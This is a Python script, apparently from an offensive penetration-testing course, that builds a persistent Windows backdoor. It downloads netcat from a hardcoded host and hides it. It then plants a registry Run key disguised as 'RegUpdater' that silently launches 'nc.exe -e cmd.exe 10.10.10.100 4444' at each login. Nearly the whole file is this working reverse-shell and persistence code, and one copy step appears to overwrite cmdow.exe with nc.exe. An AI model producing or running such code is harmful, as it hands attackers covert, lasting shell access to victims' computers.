# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import os             # needed for getting working directory
import shutil         # needed for file copying
import subprocess     # needed for getting user profile
import _winreg as wreg # needed for editing registry DB

import requests 
import time
import urllib
from shutil import copyfile
# phase -1, download nc.exe from the http and then:
import zipfile
urllib.urlretrieve("https://github.com/ritchielawrence/cmdow/zipball/master", "cmdow.zip") 
zip_ref = zipfile.ZipFile('cmdow.zip', 'r')
zip_ref.extractall('cmdow')
zip_ref.close()
current_dir = os.getcwd()
urllib.urlretrieve("http://10.10.10.100/nc.exe", "nc.exe")
#copyfile("nc.exe", current_dir + "\\cmdow\\ritchielawrence-cmdow-1bbcd2b\\bin\\Release\\nc.exe")
copyfile(current_dir + "\\cmdow\\ritchielawrence-cmdow-1bbcd2b\\bin\\Release\\cmdow.exe", "cmdow.exe")
#hidden nc.exe file
subprocess.check_call(["attrib","+H","nc.exe"])



# Reconn Phase

path = os.getcwd().strip('/n')  #Get current working directory where the backdoor gets executed, we use the output to build our source path

Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
#Get USERP ROFILE which contains the username of the profile and store it in userprof variable , we use the output to build our destination path
#Other way to discover the userprofile is via  os.getenv('userprofile') , both will give the same result 
destination = userprof.strip('\n\r') + '\\Documents\\'  +'nc.exe'
destination2 = userprof.strip('\n\r') + '\\Documents\\'  +'cmdow.exe'
#destination = userprof.strip('\n\r') + current_dir  +'nc.exe'
#destination = userprof.strip('\n\r') + '\\Documents\\'  +"nc.exe -e cmd.exe 10.10.10.100 4444"
#destination = userprof.strip('\n\r') + '\\Desktop\\'  +"nc.exe -e cmd.exe 10.10.10.100 4444"
#build the destination path where we copy your backdoor - in our example we choosed C:\Users\<UserName>\Documents\



# First and Second Phases


if not os.path.exists(destination):  # this if statement will be False next time we run the script becoz our nc.exe will be already copied in destination                                   
                                     
    #First time our backdoor gets executed
    #Copy our Backdoor to C:\Users\<UserName>\Documents\
    #shutil.copyfile(path+'\nc.exe', destination)
    shutil.copyfile(path+"\\nc.exe", destination)
    shutil.copyfile(path+"\\nc.exe", destination2)

    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
                         wreg.KEY_ALL_ACCESS)
    #destination2 = userprof.strip('\n\r') + '\\Documents\\'  +"nc.exe -e cmd.exe 10.10.10.100 4444"
    #destination2 = userprof.strip('\n\r') + '\\Documents\\'  +"nc.exe -e cmd.exe 10.10.10.100 4444"
    destination2 = userprof.strip('\n\r') + '\\Documents\\'  +"cmdow.exe /RUN /HID nc.exe -e cmd.exe 10.10.10.100 4444"
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination2)
    #wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
    key.Close()
    #create a new registry string called RegUpdater pointing to our
    #new backdoor path (destination)

#If the script worked fine, out nc.exe should be copied to C:\Users\<UserName>\Documents\ and a new registry key called 'RegUpdater' should be created
#and pointing to C:\Users\<UserName>\Documents\nc.exe 
